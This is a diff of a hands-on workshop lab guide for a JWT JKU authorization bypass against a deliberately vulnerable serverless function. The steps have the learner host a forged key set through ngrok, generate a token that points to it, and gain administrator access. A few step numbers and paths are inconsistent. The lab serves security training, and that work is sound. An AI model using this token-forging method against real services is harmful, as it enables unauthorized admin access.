@@ -1,18 +1,59 @@
 ## JWT - JKU Authorization Bypass
 
-* In your image, navigate over to `/root/labs/Serverless-Workshop/`
-* Run `pip3 install pipenv`
-* Run `pipenv install` and `pipenv shell` 
-* In your image, navigate over to `/root/labs/Serverless-Workshop/JWT-JWK`
-* Run `sls plugin install -n serverless-python-requirements`
+* Step 1: In your image, navigate over to `/root/labs/Serverless-Workshop/`
+
+```commandline
+cd /root/labs/Serverless-Workshop/
+```
+
+* Step 2: Run `pip3 install pipenv`
+
+```commandline
+pip3 install pipenv
+```
+
+* Step 3: Run `pipenv install`
+
+```commandline
+pipenv install
+```
+
+* Step 4: `pipenv shell`
+
+```commandline
+pipenv shell
+``` 
+
+* Step 5: In your image, navigate over to `/root/labs/Serverless-Workshop/JWT-JWK`
+
+```commandline
+cd /root/labs/Serverless-Workshop/JWT-JWK
+```
+
+* Step 6: Run `sls plugin install -n serverless-python-requirements`
+
+```commandline
+sls plugin install -n serverless-python-requirements
+```
+
 * Wait for instructor to explain the contents of the lab
-* Install a package for this to work `npm install -g jwt-cli`
-* Let's look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/JWT-JWK/serverless.yml)
-* Deploy the function with the command `sls deploy`
+* Step 7: Install a package for this to work `npm install -g jwt-cli`
+
+```commandline
+npm install -g jwt-cli
+```
+
+* Step 8: Let's look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/JWT-JWK/serverless.yml)
+
+* Step 9: Deploy the function with the command `sls deploy`
+
+```commandline
+sls deploy
+```
+
 * Wait for the function to deploy completely
 
-
-Initialize the Program with the following command 
+* Step 10: Initialize the Program with the following command 
 
 ```bash
 http GET https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/init
@@ -38,7 +79,7 @@ you should see an output like this
         "url": "https://jwk-resources-1564139712929.s3.amazonaws.com/jwks.json"
     }
 ```
-Now, obtain a token from the system by logging in
+* Step 11: Now, obtain a token from the system by logging in
 
 ```bash
 http POST https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/login user=admin password=admin
@@ -53,7 +94,13 @@ you should see output like this
 }
 ```
 
-Copy the `token` value and run `jwt <copied token value`, you should see something like this
+* Step 12: Copy the `token` value and run `jwt <copied token value>`
+
+```commandline
+jwt <copied token value>
+```
+
+* You should see something like this
 
 ```bash
 Header
@@ -69,14 +116,28 @@ Payload
 
 ```
 
-Now, open another two tabs of your lab image. You have now a total of three tabs. Let's call the current tab, **Tab 1**
+* Step 13: Now, open another two tabs of your lab image. You have now a total of three tabs. Let's call the current tab, **Tab 1**
 
 In the **Tab 2**: 
-* In your image, navigate over to `/root/labs/Serverless-Workshop/JWT-JWK`
-* Run: `python -m http.server`
+* Step 14: In your image, navigate over to `/root/labs/Serverless-Workshop/JWT-JWK`
+
+```commandline
+cd /root/labs/Serverless-Workshop/JWT-JWK
+```
+
+* Step 15: Run: `python -m http.server`
+
+```commandline
+python -m http.server
+```
 
 In the **Tab 3**:
-* Run `ngrok http 8000`
+
+* Step 16: Run `ngrok http 8000`
+
+```commandline
+ngrok http 8000
+```
 
 ```bash
 Session Status                online
@@ -90,12 +151,39 @@ Forwarding                    https://f8ccd11d.ngrok.io -> localhost:8000
 ```
 
 Back in **Tab 1**:
-* Run `python token_gen.py https://f8ccd11d.ngrok.io` 
-* Copy the generated token starting `ey....`
-* Run 
+* Step 17: Run `python token_gen.py https://f8ccd11d.ngrok.io`
+
+```commandline
+python token_gen.py https://f8ccd11d.ngrok.io
+```
+ 
+* Step 18: Copy the generated token starting `ey....` from the `Step 11`
+
+* Step 19: Run
+ 
 ```bash
 http GET https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/jwk Authorization:<Copied Token>
 ```
 
 You should see a response, that you are administrator
 
+
+### Teardown
+
+* Step 20: In your image, navigate over to `/root/labs/Serverless-Workshop/Basic-API`
+
+```commandline
+cd /root/labs/Serverless-Workshop/JWT-JWK
+```
+
+* Step 21: Run `sls remove` to remove stack
+
+```commandline
+sls remove
+```
+
+* Step 21: Deactivate `pipenv` using `deactivate` command
+
+```commandline
+deactivate
+```
